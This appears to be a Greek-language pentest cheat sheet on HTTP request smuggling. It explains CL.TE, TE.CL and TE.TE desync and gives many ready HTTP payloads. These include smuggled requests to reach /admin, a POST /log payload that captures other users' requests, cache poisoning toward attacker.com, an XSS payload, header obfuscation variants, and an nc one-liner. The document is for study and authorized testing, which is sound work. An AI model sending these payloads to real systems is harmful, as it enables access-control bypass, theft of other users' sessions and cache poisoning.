# 📦 HTTP Request Smuggling — Ασυμφωνία ορίων αιτημάτων

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
<a href="../README.md">🇬🇧 English</a> • <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a>
</p>

```
  ██╗  ██╗████████╗████████╗██████╗     ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
  ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ 
  ███████║   ██║      ██║   ██████╔╝    ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗
  ██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║
  ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

## Πριν ξεκινήσετε

Στο **HTTP request smuggling**, δύο διαδοχικά συστήματα διαφωνούν για τα όρια ενός αιτήματος. Οι όροι **front-end** και **back-end** εδώ σημαίνουν το σύστημα που δέχεται πρώτο την κίνηση και τον server στον οποίο την προωθεί· δεν αναφέρονται στον κώδικα διεπαφής μιας ιστοσελίδας.

**Βασικοί όροι:** *Content-Length (CL)* = μήκος σώματος σε bytes, *Transfer-Encoding (TE)* = τρόπος μεταφοράς σώματος, *chunk* = τμήμα σώματος, *desync* = ασυγχρονία ερμηνείας της ροής, *CRLF* = ακολουθία τερματισμού γραμμής HTTP/1.1.

Τα δείγματα είναι εκπαιδευτικές αναπαραστάσεις, όχι ελεγμένα πακέτα έτοιμα για αποστολή. Οι μετρήσεις μήκους, τα όρια σύνδεσης και η συμπεριφορά κάθε parser έχουν καθοριστική σημασία. Επειδή οι δοκιμές μπορεί να επηρεάσουν άλλες ροές, προτιμήστε εγκεκριμένο απομονωμένο εργαστήριο.

## Περιεχόμενα

- [🎯 Τι είναι το request smuggling](#section-01)
- [🔍 Πώς λειτουργεί](#section-02)
- [💉 Παραδείγματα δοκιμαστικών αιτημάτων](#section-03)
- [🔥 Παραδείγματα πιθανών συνεπειών](#section-04)
- [🔍 Ανίχνευση](#section-05)
- [🛠️ Εργαλεία](#section-06)
- [📊 Γρήγορη αναφορά](#section-07)
- [⚠️ Σημαντικές σημειώσεις](#section-08)
- [📚 Πηγές](#section-09)

---

<a id="section-01"></a>

## 🎯 Τι είναι το request smuggling

Το **HTTP Request Smuggling** εκμεταλλεύεται ασυμφωνίες στον τρόπο που το σύστημα εισόδου, όπως proxy, και ο τελικός server διαχωρίζουν αιτήματα HTTP. Έτσι τα ίδια bytes μπορεί να ερμηνευθούν ως διαφορετική ακολουθία αιτημάτων.

### Επίπτωση
- 🔴 **Παράκαμψη ελέγχων ασφάλειας** — WAF ή λίστες πρόσβασης ACL
- 🔴 **Αλλοίωση cache** — αποθήκευση επηρεασμένων αποκρίσεων
- 🔴 **Έκθεση στοιχείων πρόσβασης** — πιθανή ανάμειξη αιτημάτων άλλων χρηστών
- 🔴 **XSS** — πιθανή αντανάκλαση εισόδου μέσω διαφορετικής ερμηνείας αιτήματος

---

<a id="section-02"></a>

## 🔍 Πώς λειτουργεί

### Σχετικές κεφαλίδες
```http
Content-Length: 13
Transfer-Encoding: chunked
```

### Τύποι ασυμφωνίας
| Τύπος | Το σύστημα εισόδου χρησιμοποιεί | Ο τελικός server χρησιμοποιεί |
|------|----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | Διαφορετική ερμηνεία μη τυπικής κεφαλίδας TE | Η μία πλευρά αγνοεί την κεφαλίδα TE |

---

<a id="section-03"></a>

## 💉 Παραδείγματα δοκιμαστικών αιτημάτων

> **Η ακρίβεια bytes είναι μέρος του προβλήματος:** Τα Content-Length, chunk sizes και οι τερματισμοί γραμμών του πρωτοτύπου είναι ενδεικτικά και δεν έχουν επικυρωθεί ως πλήρη αιτήματα. Σχόλια με # μέσα στα blocks είναι επεξηγήσεις, όχι γραμμές προς αποστολή. Η αντιγραφή Markdown μπορεί να αλλάξει CRLF ή να προκαλέσει αυτόματο επανυπολογισμό μήκους από client. Δείτε την [τεκμηρίωση request smuggling](https://portswigger.net/web-security/request-smuggling).


### CL.TE (Content-Length → Transfer-Encoding)

**Το σύστημα εισόδου χρησιμοποιεί Content-Length και ο τελικός server Transfer-Encoding**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Παράδειγμα αξιοποίησης της ασυμφωνίας:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

### TE.CL (Transfer-Encoding → Content-Length)

**Το σύστημα εισόδου χρησιμοποιεί Transfer-Encoding και ο τελικός server Content-Length**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### TE.TE — Μη τυπική γραφή Transfer-Encoding

```http
# Μη τυπικές γραφές της κεφαλίδας TE
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding
 : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked#
```

---

<a id="section-04"></a>

## 🔥 Παραδείγματα πιθανών συνεπειών

### Παράκαμψη ελέγχων στο σύστημα εισόδου
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Foo: x
```

### Ενδεχόμενη ανάμειξη αιτημάτων άλλων χρηστών
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```
*Στο συγκεκριμένο σενάριο, επόμενο αίτημα μπορεί να προστεθεί στο `data=`. Η συμπεριφορά εξαρτάται από σύνδεση, δρομολόγηση και parsing.*

### Αλλοίωση cache μέσω request smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/script.js HTTP/1.1
Host: vulnerable.com
X-Ignore: X
GET /malicious HTTP/1.1
Host: attacker.com
Foo: x
```

### XSS μέσω request smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /page?param=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com
Foo: x
```

---

<a id="section-05"></a>

## 🔍 Ανίχνευση

> **Timeout και 404 δεν αρκούν:** Παρόμοια αποτελέσματα προκαλούνται από δίκτυο, throttling και κανονικό parsing σφαλμάτων. Απαιτούνται επαναλήψιμα ελεγχόμενα αποτελέσματα και σωστή συσχέτιση της ροής. Proxy, CDN ή μετατροπή HTTP/2 σε HTTP/1.1 δεν σημαίνει αυτόματα ευπαθή εγκατάσταση.


### Αναγνώριση βάσει χρονισμού
```http
# Δοκιμή CL.TE
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

# Αν ο τελικός server ερμηνεύει TE, μπορεί να περιμένει τελικό τμήμα "0"
# Το timeout είναι μόνο ένδειξη για διερεύνηση
```

### Σύγκριση διαφορετικών αποκρίσεων
```http
# Παράδειγμα δεύτερου αιτήματος για ανύπαρκτη διαδρομή
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: bar

# Διαφορετική επόμενη απόκριση απαιτεί ελεγχόμενη επιβεβαίωση, όχι αυτόματο συμπέρασμα
```

---

<a id="section-06"></a>

## 🛠️ Εργαλεία

### Πρόσθετο Burp Suite
```
1. Εγκαταστήστε το πρόσθετο "HTTP Request Smuggler"
2. Δεξί κλικ στο αίτημα → Extensions → Launch Smuggle Probe
3. Εξετάστε τα αποτελέσματα για ενδείξεις request smuggling
```

### smuggler.py
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://target.com
```

### Χειροκίνητη αποστολή πρωτοκόλλου
```bash
# Τα εργαλεία μπορούν να κανονικοποιούν κεφαλίδες· το παράδειγμα στέλνει bytes μέσω TCP
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80
```

---

<a id="section-07"></a>

## 📊 Γρήγορη αναφορά

### Λίστα ελέγχων αναγνώρισης
```markdown
- [ ] Έλεγχος ύπαρξης proxy ή load balancer μεταξύ συστημάτων
- [ ] Έλεγχος χρονισμού CL.TE
- [ ] Έλεγχος χρονισμού TE.CL
- [ ] Έλεγχος διαφορετικών γραφών κεφαλίδας TE
- [ ] Διασταύρωση με ελεγχόμενη σύγκριση αποκρίσεων
```

### Συνήθεις αρχιτεκτονικές όπου εξετάζεται το πρόβλημα
```
- Κατανεμητές φορτίου (AWS ALB, HAProxy)
- Αντίστροφοι διαμεσολαβητές (nginx, Apache)
- Δίκτυα διανομής περιεχομένου CDN (Cloudflare, Akamai)
- Μετατροπή HTTP/2 σε HTTP/1.1
```

---

<a id="section-08"></a>

## ⚠️ Σημαντικές σημειώσεις

```
1. Οι δοκιμές μπορούν να επηρεάσουν άλλους χρήστες
2. Προτιμήστε απομονωμένο περιβάλλον ελέγχου όπου είναι διαθέσιμο
3. Χρησιμοποιήστε μοναδικές ενδείξεις για συσχέτιση των δικών σας αιτημάτων
4. Υποβάλετε τεκμηριωμένη αναφορά με μικρή απόδειξη
```

---

<a id="section-09"></a>

## 📚 Πηγές

- [Οδηγός request smuggling της PortSwigger](https://portswigger.net/web-security/request-smuggling)
- [Έρευνα HTTP Desync Attacks του Albinowax](https://portswigger.net/research/http-desync-attacks)
- [Εργαλείο Smuggler](https://github.com/defparam/smuggler)

---

<p align="center">
  <b>📦 Κατανοήστε τα όρια αιτημάτων HTTP!</b><br>
  <i>Μόνο για εξουσιοδοτημένους ελέγχους.</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
